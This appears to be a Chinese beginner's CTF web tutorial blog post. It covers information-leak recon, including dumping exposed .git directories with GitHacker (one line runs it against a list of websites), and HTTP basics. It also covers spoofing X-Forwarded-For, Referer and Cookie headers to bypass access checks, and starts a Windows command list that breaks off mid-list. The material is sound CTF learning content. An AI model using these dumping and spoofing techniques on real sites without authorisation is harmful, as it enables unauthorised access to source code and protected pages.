<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>web入个门 | 1azy_fish.</title><meta name="author" content="1azy_fish."><meta name="copyright" content="1azy_fish."><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTF_web入门信息泄露查看源代码页面源代码是信息的一个重要来处F12和右击查看源代码都可以 目录扫描dirsearch与御剑 dirsearch安装：apt install dirsearch   git泄露GitHacker安装与使用 12345678910# installpython3 -m pip install -i https:&#x2F;&#x2F;pypi.org&#x2F;simple&#x2F; GitHacke"><meta property="og:type" content="article"><meta property="og:title" content="web入个门"><meta property="og:url" content="https://gitee.com/la2y_fish/blog.git/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/index.html"><meta property="og:site_name" content="1azy_fish."><meta property="og:description" content="CTF_web入门信息泄露查看源代码页面源代码是信息的一个重要来处F12和右击查看源代码都可以 目录扫描dirsearch与御剑 dirsearch安装：apt install dirsearch   git泄露GitHacker安装与使用 12345678910# installpython3 -m pip install -i https:&#x2F;&#x2F;pypi.org&#x2F;simple&#x2F; GitHacke"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://i.ytimg.com/vi/QxuzfHLPhmI/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGDMgUCh_MA8=&rs=AOn4CLDOr42OYNULHlzMX6yPFeduoFKa2w"><meta property="article:published_time" content="2023-08-06T11:25:58.000Z"><meta property="article:modified_time" content="2023-10-03T10:39:09.467Z"><meta property="article:author" content="1azy_fish."><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://i.ytimg.com/vi/QxuzfHLPhmI/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGDMgUCh_MA8=&rs=AOn4CLDOr42OYNULHlzMX6yPFeduoFKa2w"><link rel="shortcut icon" href="/blog/img/%E8%8A%9C%E6%B9%96.png"><link rel="canonical" href="https://gitee.com/la2y_fish/blog.git/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/blog/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG={root:"/blog/",algolia:void 0,localSearch:void 0,translate:void 0,noticeOutdate:{limitDay:500,position:"top",messagePrev:"It has been",messageNext:"days since the last update, the content of the article may be outdated."},highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:void 0,source:{justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js",css:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css"}},isPhotoFigcaption:!1,islazyload:!1,isAnchor:!1,percent:{toc:!0,rightside:!1}}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"web入个门",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2023-10-03 18:39:09"}</script><noscript><style type="text/css">#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,a){0!==a&&(a=864e5*a,t={value:t,expiry:(new Date).getTime()+a},localStorage.setItem(e,JSON.stringify(t)))},get:function(e){var t=localStorage.getItem(e);if(t){t=JSON.parse(t);if(!((new Date).getTime()>t.expiry))return t.value;localStorage.removeItem(e)}}},e.getScript=o=>new Promise((t,e)=>{const a=document.createElement("script");a.src=o,a.async=!0,a.onerror=e,a.onload=a.onreadystatechange=function(){var e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,t())},document.head.appendChild(a)}),e.getCSS=(o,n=!1)=>new Promise((t,e)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=o,n&&(a.id=n),a.onerror=e,a.onload=a.onreadystatechange=function(){var e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,t())},document.head.appendChild(a)}),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};e=saveToLocal.get("theme"),"dark"===e?activateDarkMode():"light"===e&&activateLightMode(),e=saveToLocal.get("aside-status");void 0!==e&&("hide"===e?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/macWhite.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="/blog/img/head%20(1).jpg" onerror='onerror=null,src="/img/head (1).jpg"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/blog/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/blog/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/blog/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/blog/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/blog/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/blog/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/blog/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/blog/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/blog/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/blog/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/blog/movies/"><i class="fa-fw fas fa-video"></i><span> 番剧</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/blog/tool/"><i class="fa-fw fas fa-box"></i><span> 工具箱（更新ing）</span></a></div><div class="menus_item"><a class="site-page" href="/blog/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/blog/comments/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/blog/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://i.ytimg.com/vi/QxuzfHLPhmI/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGDMgUCh_MA8=&amp;rs=AOn4CLDOr42OYNULHlzMX6yPFeduoFKa2w)"><nav id="nav"><span id="blog-info"><a href="/blog/" title="1azy_fish."><span class="site-name">1azy_fish.</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/blog/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/blog/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/blog/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/blog/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/blog/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/blog/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/blog/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/blog/movies/"><i class="fa-fw fas fa-video"></i><span> 番剧</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/blog/tool/"><i class="fa-fw fas fa-box"></i><span> 工具箱（更新ing）</span></a></div><div class="menus_item"><a class="site-page" href="/blog/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/blog/comments/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/blog/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">web入个门</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-06T11:25:58.000Z" title="发表于 2023-08-06 19:25:58">2023-08-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-03T10:39:09.467Z" title="更新于 2023-10-03 18:39:09">2023-10-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/blog/categories/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="web入个门"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CTF-web入门"><a href="#CTF-web入门" class="headerlink" title="CTF_web入门"></a>CTF_web入门</h1><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><p>页面源代码是信息的一个重要来处F12和右击查看源代码都可以</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>dirsearch与御剑</p><p>dirsearch安装：<code>apt install dirsearch</code></p><img src="/img/loading.gif" data-original="/blog/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/6.png" title="wuhu"><h3 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h3><p>GitHacker安装与使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install</span></span><br><span class="line">python3 -m pip install -i https://pypi.org/simple/ GitHacker</span><br><span class="line"><span class="comment"># print help info</span></span><br><span class="line">githacker --<span class="built_in">help</span></span><br><span class="line"><span class="comment"># quick start</span></span><br><span class="line">githacker --url http://127.0.0.1/.git/ --output-folder result</span><br><span class="line"><span class="comment"># brute for the name of branchs / tags</span></span><br><span class="line">githacker --brute --url http://127.0.0.1/.git/ --output-folder result</span><br><span class="line"><span class="comment"># exploit multiple websites, one site per line</span></span><br><span class="line">githacker --brute --url-file websites.txt --output-folder result</span><br></pre></td></tr></table></figure><p>可以进入对应文件夹然后使用 <code>git log</code>查看对应日志，通过 <code>git reset --hard xxxxxxxxxxxxxxxxxxxxxxx</code> 以达到恢复已删除内容的效果。</p><h3 id="DS-Store泄露"><a href="#DS-Store泄露" class="headerlink" title="DS_Store泄露"></a>DS_Store泄露</h3><p>工具下载与使用：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>爬虫协议，有时可以通过它看见一些重要的目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /images/</span><br><span class="line">Disallow: /f1ag.txt/</span><br><span class="line">Disallow: /tips.php</span><br></pre></td></tr></table></figure><h3 id="备份文件源码泄漏"><a href="#备份文件源码泄漏" class="headerlink" title="备份文件源码泄漏"></a>备份文件源码泄漏</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ly584521/p/13969810.html">CTF-WEB-信息泄露题目总结 - Ca1m - 博客园 (cnblogs.com)</a></p><h2 id="HTTP学习"><a href="#HTTP学习" class="headerlink" title="HTTP学习"></a>HTTP学习</h2><p>web安全中，入门的时候，你需要理解的是http头的内容，至少</p><h3 id="HTTP请求中的一些请求头"><a href="#HTTP请求中的一些请求头" class="headerlink" title="HTTP请求中的一些请求头"></a>HTTP请求中的一些请求头</h3><blockquote><p>1、Host：指定目标服务器的主机名或IP地址。</p><p>2、User-Agent：指定客户端使用的浏览器或其他应用程序的信息。</p><p>3、Accept：指定客户端能够接受的MIME类型。</p><p>4、Accept-Language：指定客户端首选的自然语言。</p><p>5、Accept-Encoding：指定客户端能够接受的编码方式，例如gzip、deflate等。</p><p>6、Connection：指定客户端与服务器之间使用的连接类型，例如keep-alive或close。</p><p>7、Content-Type：指定请求体的MIME类型，例如application&#x2F;json、application&#x2F;x-www-form-urlencoded等。</p><p>8、Content-Length：指定请求体的长度，以字节为单位。</p><p>9、Referer：指定请求的来源URL，用于告诉服务器用户从哪个页面跳转到当前页面。</p><p>10、Authorization：指定请求的认证信息，例如用户名和密码或访问令牌。</p><p>11、Cookie：指定请求的Cookie信息，用于跟踪用户会话。</p><p>12、If-Modified-Since：指定上次请求资源的时间，服务器可以根据该头部判断资源是否已经被修改过。</p><p>13、User-Agent：指定客户端使用的浏览器或其他应用程序的信息。</p><p>14、Accept-Ranges：指定服务器是否支持分段下载，例如bytes。</p><p>15、Range：指定客户端请求的资源范围，用于实现分段下载或断点续传。</p><p>16、Cache-Control：指定请求或响应的缓存策略，例如max-age、no-cache、no-store等</p></blockquote><h3 id="HTTP请求中的一些常用自定义请求头"><a href="#HTTP请求中的一些常用自定义请求头" class="headerlink" title="HTTP请求中的一些常用自定义请求头"></a>HTTP请求中的一些常用自定义请求头</h3><blockquote><p>X-Forwarded-Host 头部是在HTTP代理或负载均衡器后面使用的。</p><p>X-Forwarded-For：用于记录客户端的IP地址，特别在使用代理服务器时。</p><p>X-Requested-With：用于指示请求的类型，例如XMLHttpRequest。</p><p>X-Csrf-Token：用于防止跨站请求伪造攻击。</p><p>X-Content-Type-Options：用于指示浏览器是否应该自动处理响应体的MIME类型，例如nosniff。</p><p>X-Frame-Options：用于控制页面是否可以嵌入到iframe中，防止点击劫持攻击。</p><p>X-XSS-Protection：用于启用浏览器内置的跨站脚本攻击防护机制。</p><p>X-Powered-By：用于指示服务器所使用的软件名称和版本号。</p></blockquote><h3 id="常见的Content-Type类型包括："><a href="#常见的Content-Type类型包括：" class="headerlink" title="常见的Content-Type类型包括："></a>常见的Content-Type类型包括：</h3><blockquote><p>application&#x2F;json：用于传输JSON格式的数据。</p><p>application&#x2F;x-www-form-urlencoded：用于传输HTML表单数据，即URL编码的键值对。</p><p>multipart&#x2F;form-data：用于传输文件和二进制数据。</p><p>text&#x2F;plain：用于传输纯文本数据。</p></blockquote><h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><p>HTTP 定义了一组<strong>请求方法</strong>，以表明要对给定资源执行的操作。指示针对给定资源要执行的期望动作。虽然它们也可以是名词，但这些请求方法有时被称为 <em>HTTP 动词</em>。每一个请求方法都实现了不同的语义，但一些共同的特征由一组共享：例如一个请求方法可以是<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/Safe">安全的</a>、<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/Idempotent">幂等的</a>或<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cacheable">可缓存的</a>。</p><ul><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET"><code>GET</code></a></p><p><code>GET</code> 方法请求一个指定资源的表示形式，使用 <code>GET</code> 的请求应该只被用于获取数据。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD"><code>HEAD</code></a></p><p><code>HEAD</code> 方法请求一个与 <code>GET</code> 请求的响应相同的响应，但没有响应体。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a></p><p><code>POST</code> 方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT"><code>PUT</code></a></p><p><code>PUT</code> 方法用有效载荷请求替换目标资源的所有当前表示。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/DELETE"><code>DELETE</code></a></p><p><code>DELETE</code> 方法删除指定的资源。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/CONNECT"><code>CONNECT</code></a></p><p><code>CONNECT</code> 方法建立一个到由目标资源标识的服务器的隧道。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS"><code>OPTIONS</code></a></p><p><code>OPTIONS</code> 方法用于描述目标资源的通信选项。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/TRACE"><code>TRACE</code></a></p><p><code>TRACE</code> 方法沿着到目标资源的路径执行一个消息环回测试。</p></li><li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PATCH"><code>PATCH</code></a></p><p><code>PATCH</code> 方法用于对资源应用部分修改。</p></li></ul><p>这里常用的是post和get的请求方式</p><h3 id="GET-amp-POST"><a href="#GET-amp-POST" class="headerlink" title="GET&amp;POST"></a>GET&amp;POST</h3><p>Get和Post操作是传参的基本操作，也是CTF中很常见的常规操作，使用<code>hackbar</code>可以很轻松的完成这个任务。</p><p>GET：在<code>url</code>中提交参数，如<code>/index.php?a=1</code></p><p>POST：可通过<code>hackbar</code>或抓包插入post数据提交</p><img src="/img/loading.gif" data-original="/blog/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/post.png" title="wuhu"><p>最直接的区别：</p><p>GET请求的参数是放在URL里的，POST请求参数是放在请求body里的。</p><h3 id="HTTP头部绕过姿势"><a href="#HTTP头部绕过姿势" class="headerlink" title="HTTP头部绕过姿势"></a>HTTP头部绕过姿势</h3><ul><li><p>如果提示需要本地ip或指定ip才能访问，则可在报文头部添加以下几种常用信息段：</p><blockquote><p>X-Forwarded-For: 127.0.0.1<br>X-Client-IP: 127.0.0.1<br>Client-IP: 127.0.0.1</p></blockquote></li><li><p>如果需要验证网页来源，如一定要从谷歌跳转过来的页面才允许访问，则可在报文头部添加：</p><blockquote><p>Referer: <a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a></p></blockquote></li><li><p>如果网页需要验证cookie，我们可以在http头部加入：</p><blockquote><p>Cookie: xxx&#x3D;xxxxx</p></blockquote></li><li><p>除了以上几种常见的情况，还需根据具体情况来使用不同的操作</p></li></ul><h2 id="Dos命令"><a href="#Dos命令" class="headerlink" title="Dos命令"></a>Dos命令</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ASSOC</span>          显示或修改文件扩展名关联。</span><br><span class="line"><span class="built_in">ATTRIB</span>         显示或更改文件属性。</span><br><span class="line"><span class="built_in">BREAK</span>          设置或清除扩展式 CTRL+C 检查。</span><br><span class="line">BCDEDIT        设置启动数据库中的属性以控制启动加载。</span><br><span class="line"><span class="built_in">CACLS</span>          显示或修改文件的访问控制列表(ACL)。</span><br><span class="line"><span class="keyword">CALL</span>           从另一个批处理程序调用这一个。</span><br><span class="line"><span class="built_in">CD</span>             显示当前目录的名称或将其更改。</span><br><span class="line"><span class="built_in">CHCP</span>           显示或设置活动代码页数。</span><br><span class="line"><span class="built_in">CHDIR</span>          显示当前目录的名称或将其更改。</span><br><span class="line"><span class="built_in">CHKDSK</span>         检查磁盘并显示状态报告。</span><br><span class="line"><span class="built_in">CHKNTFS</span>        显示或修改启动时间磁盘检查。</span><br><span class="line"><span class="built_in">CLS</span>            清除屏幕。</span><br><span class="line"><span class="built_in">CMD</span>            打开另一个 Windows 命令解释程序窗口。</span><br><span class="line"><span class="built_in">COLOR</span>          设置默认控制台前景和背景颜色。</span><br><span class="line"><span class="built_in">COMP</span>           比较两个或两套文件的内容。</span><br><span class="line"><span class="built_in">COMPACT</span>        显示或更改 NTFS 分区上文件的压缩。</span><br><span class="line"><span class="built_in">CONVERT</span>        将 FAT 卷转换成 NTFS。你不能转换</span><br><span class="line">               当前驱动器。</span><br><span class="line"><span class="built_in">COPY</span>           将至少一个文件复制到另一个位置。</span><br><span class="line"><span class="built_in">DATE</span>           显示或设置日期。</span><br><span class="line"><span class="built_in">DEL</span>            删除至少一个文件。</span><br><span class="line"><span class="built_in">DIR</span>            显示一个目录中的文件和子目录。</span><br><span class="line">DISKPART       显示或配置磁盘分区属性。</span><br><span class="line"><span class="built_in">DOSKEY</span>         编辑命令行、撤回 Windows 命令并</span><br><span class="line">               创建宏。</span><br><span class="line">DRIVERQUERY    显示当前设备驱动程序状态和属性。</span><br><span class="line"><span class="built_in">ECHO</span>           显示消息，或将命令回显打开或关闭。</span><br><span class="line"><span class="built_in">ENDLOCAL</span>       结束批文件中环境更改的本地化。</span><br><span class="line"><span class="built_in">ERASE</span>          删除一个或多个文件。</span><br><span class="line"><span class="keyword">EXIT</span>           退出 <span class="built_in">CMD</span>.EXE 程序(命令解释程序)。</span><br><span class="line">FC             比较两个文件或两个文件集并显示</span><br><span class="line">               它们之间的不同。</span><br><span class="line"><span class="built_in">FIND</span>           在一个或多个文件中搜索一个文本字符串。</span><br><span class="line"><span class="built_in">FINDSTR</span>        在多个文件中搜索字符串。</span><br><span class="line"><span class="keyword">FOR</span>            为一组文件中的每个文件运行一个指定的命令。</span><br><span class="line"><span class="built_in">FORMAT</span>         格式化磁盘，以便用于 Windows。</span><br><span class="line">FSUTIL         显示或配置文件系统属性。</span><br><span class="line"><span class="built_in">FTYPE</span>          显示或修改在文件扩展名关联中使用的文件</span><br><span class="line">               类型。</span><br><span class="line"><span class="keyword">GOTO</span>           将 Windows 命令解释程序定向到批处理程序</span><br><span class="line">               中某个带标签的行。</span><br><span class="line">GPRESULT       显示计算机或用户的组策略信息。</span><br><span class="line"><span class="built_in">GRAFTABL</span>       使 Windows 在图形模式下显示扩展</span><br><span class="line">               字符集。</span><br><span class="line"><span class="built_in">HELP</span>           提供 Windows 命令的帮助信息。</span><br><span class="line">ICACLS         显示、修改、备份或还原文件和</span><br><span class="line">               目录的 ACL。</span><br><span class="line"><span class="keyword">IF</span>             在批处理程序中执行有条件的处理操作。</span><br><span class="line"><span class="built_in">LABEL</span>          创建、更改或删除磁盘的卷标。</span><br><span class="line"><span class="built_in">MD</span>             创建一个目录。</span><br><span class="line"><span class="built_in">MKDIR</span>          创建一个目录。</span><br><span class="line">MKLINK         创建符号链接和硬链接</span><br><span class="line"><span class="built_in">MODE</span>           配置系统设备。</span><br><span class="line"><span class="built_in">MORE</span>           逐屏显示输出。</span><br><span class="line"><span class="built_in">MOVE</span>           将一个或多个文件从一个目录移动到另一个</span><br><span class="line">               目录。</span><br><span class="line">OPENFILES      显示远程用户为了文件共享而打开的文件。</span><br><span class="line"><span class="built_in">PATH</span>           为可执行文件显示或设置搜索路径。</span><br><span class="line"><span class="built_in">PAUSE</span>          暂停批处理文件的处理并显示消息。</span><br><span class="line"><span class="built_in">POPD</span>           还原通过 <span class="built_in">PUSHD</span> 保存的当前目录的上一个</span><br><span class="line">               值。</span><br><span class="line"><span class="built_in">PRINT</span>          打印一个文本文件。</span><br><span class="line">PROMPT         更改 Windows 命令提示。</span><br><span class="line"><span class="built_in">PUSHD</span>          保存当前目录，然后对其进行更改。</span><br><span class="line"><span class="built_in">RD</span>             删除目录。</span><br><span class="line"><span class="built_in">RECOVER</span>        从损坏的或有缺陷的磁盘中恢复可读信息。</span><br><span class="line"><span class="comment">REM            记录批处理文件或 CONFIG.SYS 中的注释(批注)。</span></span><br><span class="line"><span class="built_in">REN</span>            重命名文件。</span><br><span class="line"><span class="built_in">RENAME</span>         重命名文件。</span><br><span class="line"><span class="built_in">REPLACE</span>        替换文件。</span><br><span class="line"><span class="built_in">RMDIR</span>          删除目录。</span><br><span class="line">ROBOCOPY       复制文件和目录树的高级实用工具</span><br><span class="line"><span class="built_in">SET</span>            显示、设置或删除 Windows 环境变量。</span><br><span class="line"><span class="built_in">SETLOCAL</span>       开始本地化批处理文件中的环境更改。</span><br><span class="line">SC             显示或配置服务(后台进程)。</span><br><span class="line">SCHTASKS       安排在一台计算机上运行命令和程序。</span><br><span class="line"><span class="built_in">SHIFT</span>          调整批处理文件中可替换参数的位置。</span><br><span class="line">SHUTDOWN       允许通过本地或远程方式正确关闭计算机。</span><br><span class="line"><span class="built_in">SORT</span>           对输入排序。</span><br><span class="line"><span class="built_in">START</span>          启动单独的窗口以运行指定的程序或命令。</span><br><span class="line"><span class="built_in">SUBST</span>          将路径与驱动器号关联。</span><br><span class="line">SYSTEMINFO     显示计算机的特定属性和配置。</span><br><span class="line">TASKLIST       显示包括服务在内的所有当前运行的任务。</span><br><span class="line"><span class="built_in">TASKKILL</span>       中止或停止正在运行的进程或应用程序。</span><br><span class="line"><span class="built_in">TIME</span>           